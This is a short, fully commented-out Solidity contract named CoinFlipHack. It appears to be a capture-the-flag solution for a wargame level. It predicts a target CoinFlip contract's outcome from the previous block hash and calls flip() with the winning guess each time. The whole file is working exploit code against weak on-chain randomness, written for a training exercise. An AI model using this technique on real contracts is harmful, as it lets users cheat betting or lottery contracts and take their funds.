// // SPDX-License-Identifier: MIT
// pragma solidity ^0.8.0;

// import {Counters} from "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Counters.sol";
// import {CoinFlip} from "./CoinFlip.sol";

// contract CoinFlipHack {
//     using Counters for Counters.Counter;
//     uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
//     address coinFlipContract;
//     Counters.Counter public callsToCoinFlip;

//     constructor(address _coinFlipContract) {
//         coinFlipContract = _coinFlipContract;
//     }


//     function flipHack() public {
//         uint256 blockValue = uint256(blockhash(block.number - 1));

//         uint256 coinFlip = blockValue / FACTOR;
//         bool side = coinFlip == 1 ? true : false;

//         if (CoinFlip(coinFlipContract).flip(side)) callsToCoinFlip.increment();
//     }
// }